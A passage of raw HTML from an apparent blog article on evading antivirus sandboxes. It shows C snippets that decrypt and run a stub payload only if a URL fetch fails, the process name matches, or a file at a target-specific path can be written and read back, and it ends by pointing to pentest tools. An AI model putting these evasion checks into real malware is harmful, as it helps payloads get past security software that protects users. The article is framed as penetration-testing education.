id="crayon-59ca5e7cae36a567733701-10">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-11"><span class="crayon-e">HINTERNET </span><span class="crayon-v">httpopen</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">openurl</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-12">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-13"><span class="crayon-e">DWORD </span><span class="crayon-v">read</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-14">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-15"><span class="crayon-v">httpopen</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">InternetOpen</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">INTERNET_OPEN_TYPE_DIRECT</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">openurl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">InternetOpenUrl</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">httpopen</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">cononstart</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">INTERNET_FLAG_RELOAD</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">INTERNET </span><span class="crayon-v">_FLAG_NO_CACHE_WRITE</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-16">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-17"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-i">openurl</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-c">// Access failed, we are not in AV</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-18">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-19"><span class="crayon-e">InternetCloseHandle</span><span class="crayon-sy">(</span><span class="crayon-v">httpopen</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-20">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-21"><span class="crayon-e">InternetCloseHandle</span><span class="crayon-sy">(</span><span class="crayon-v">openurl</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-22">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-23"><span class="crayon-e">decryptAndRunPayload</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-24">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-25"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-26">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-27"><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-c">// Access successful, we are in AV and redirected to a custom webpage</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-28">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-29"><span class="crayon-e">InternetCloseHandle</span><span class="crayon-sy">(</span><span class="crayon-v">httpopen</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-30">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-31"><span class="crayon-e">InternetCloseHandle</span><span class="crayon-sy">(</span><span class="crayon-v">openurl</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-32">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-33"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-34">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-35"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-36">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-37"><span class="crayon-sy">}</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    <!-- [Format Time: 0.0021 seconds] -->
    <p>
    <strong>What did you call me?</strong></p>
    <p>Apparently, AVs change the process name. We use the process name to decide if we want to decrypt the payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
    
    <div id="crayon-59ca5e7cae370518526945" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    int main(int argc, char * argv[]) {
    
    if (strstr(argv[0], "test.exe") &gt;0) {
    
    decryptPayload();
    
    runPayload();
    
    }
    
    return 0;
    
    }</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae370518526945-2">2</div><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae370518526945-4">4</div><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae370518526945-6">6</div><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae370518526945-8">8</div><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae370518526945-10">10</div><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae370518526945-12">12</div><div class="crayon-num" data-line="crayon-59ca5e7cae370518526945-13">13</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59ca5e7cae370518526945-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">argc</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-v">argv</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae370518526945-2">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae370518526945-3"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">strstr</span><span class="crayon-sy">(</span><span class="crayon-v">argv</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"test.exe"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae370518526945-4">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae370518526945-5"><span class="crayon-e">decryptPayload</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae370518526945-6">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae370518526945-7"><span class="crayon-e">runPayload</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae370518526945-8">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae370518526945-9"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae370518526945-10">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae370518526945-11"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae370518526945-12">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae370518526945-13"><span class="crayon-sy">}</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    <!-- [Format Time: 0.0007 seconds] -->
    <p>
    Short and sweet! Has an obvious flaw though – it won&#8217;t run if user renames the file.</p>
    <p><strong>Knowing your target</strong></p>
    <p>In this example, we&#8217;ll use some specific information about the target system. This could be a username, existence of a specific file etc.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
    
    <div id="crayon-59ca5e7cae376838414530" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    #define FILE_PATH "C:\\Users\\bob\\Desktop\\tmp.file"
    
    int main() {
    
    HANDLE file;
    
    DWORD tmp;
    
    LPCVOID buff = "1234";
    
    char outputbuff[5]={0};
    
    file = CreateFile(FILE_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    
    if(WriteFile(file, buff, strlen((const char *)buff), &amp;tmp, NULL)) {
    
    CloseHandle(file);
    
    file = CreateFile(FILE_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
    
    FILE_ATTRIBUTE_NORMAL , NULL);
    
    if(ReadFile(file,outputbuff,4,&amp;tmp,NULL)) {
    
    if(strncmp(buff,outputbuff,4)==0) {
    
    decryptCodeSection();
    
    startShellCode();
    
    }
    
    }
    
    CloseHandle(file);
    
    }
    
    DeleteFile(FILE_PATH);
    
    
    
    return 0;
    
    }</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-2">2</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-4">4</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-6">6</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-8">8</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-10">10</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-12">12</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-14">14</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-16">16</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-18">18</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-20">20</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-22">22</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-24">24</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-26">26</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-28">28</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-30">30</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-32">32</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-34">34</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-36">36</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-38">38</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-40">40</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-42">42</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae376838414530-44">44</div><div class="crayon-num" data-line="crayon-59ca5e7cae376838414530-45">45</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59ca5e7cae376838414530-1"><span class="crayon-p">#define FILE_PATH "C:\\Users\\bob\\Desktop\\tmp.file"</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-2">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-3"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-4">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-5"><span class="crayon-e">HANDLE </span><span class="crayon-v">file</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-6">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-7"><span class="crayon-e">DWORD </span><span class="crayon-v">tmp</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-8">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-9"><span class="crayon-e">LPCVOID </span><span class="crayon-v">buff</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"1234"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-10">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-11"><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-v">outputbuff</span><span class="crayon-sy">[</span><span class="crayon-cn">5</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">{</span><span class="crayon-cn">0</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-12">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-13"><span class="crayon-v">file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateFile</span><span class="crayon-sy">(</span><span class="crayon-v">FILE_PATH</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">GENERIC_WRITE</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">CREATE_ALWAYS</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">FILE_ATTRIBUTE_NORMAL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-14">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-15"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">WriteFile</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">buff</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-v">buff</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">tmp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-16">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-17"><span class="crayon-e">CloseHandle</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-18">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-19"><span class="crayon-v">file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateFile</span><span class="crayon-sy">(</span><span class="crayon-v">FILE_PATH</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">GENERIC_READ</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">FILE_SHARE_READ</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">OPEN_EXISTING</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-20">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-21"><span class="crayon-v">FILE_ATTRIBUTE</span><span class="crayon-sy">_</span>NORMAL<span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-22">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-23"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">ReadFile</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-sy">,</span><span class="crayon-v">outputbuff</span><span class="crayon-sy">,</span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-o">&amp;</span><span class="crayon-v">tmp</span><span class="crayon-sy">,</span><span class="crayon-t">NULL</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-24">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-25"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">strncmp</span><span class="crayon-sy">(</span><span class="crayon-v">buff</span><span class="crayon-sy">,</span><span class="crayon-v">outputbuff</span><span class="crayon-sy">,</span><span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-o">==</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-26">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-27"><span class="crayon-e">decryptCodeSection</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-28">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-29"><span class="crayon-e">startShellCode</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-30">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-31"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-32">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-33"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-34">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-35"><span class="crayon-e">CloseHandle</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-36">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-37"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-38">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-39"><span class="crayon-e">DeleteFile</span><span class="crayon-sy">(</span><span class="crayon-v">FILE_PATH</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-40">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-41"> </div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-42">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-43"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae376838414530-44">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae376838414530-45"><span class="crayon-sy">}</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    <!-- [Format Time: 0.0026 seconds] -->
    <p>
    Needless to say, this works. In fact, AV scanners will generally fail to create and write into a file which is in a path not foreseen. I was surprised at first because I expected AV to self adapt to the host PC, but it is not the case.</p>
    <p><strong>Conclusion</strong></p>
    <p>Antivirus detection systems are not difficult to bypass if you understand how they work. Stay tuned for advanced concepts for bypassing AV. If you cannot wait, I recommend looking at high quality open source tools for pentesters such as AVET which was presented at last Black Hat conference.</p>
    <p>Knowing your opponent works for hackers as well as their targets – learn hackers tools of trade and you&#8217;ll be safer. If you want to check your computer for malware, research malware persistence methods as well as communication with command and control server. Take a look at places where malware usually resides as well as all traffic to and from your machine.</p>
    
    
    </div><!-- .entry /-->
    <span style="display:none"><a href="https://www.deepdotweb.com/tag/antivirus/" rel="tag">antivirus</a> <a href="https://www.deepdotweb.com/tag/modern/" rel="tag">modern</a> <a href="https://www.deepdotweb.com/tag/part/" rel="tag">part</a> <a href="https://www.deepdotweb.com/tag/software/" rel="tag">software</a> <a href="https://www.deepdotweb.com/tag/testing/" rel="tag">testing</a></span>				<span style="display:none" class="updated">2017-09-25</span>
    <div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><a href="https://www.deepdotweb.com/author/filipjelic/" title="Posts by Filip Jelic" rel="author">Filip Jelic</a></strong></div>
    
    
    </div><!-- .post-inner -->
</article><!-- .post-listing -->

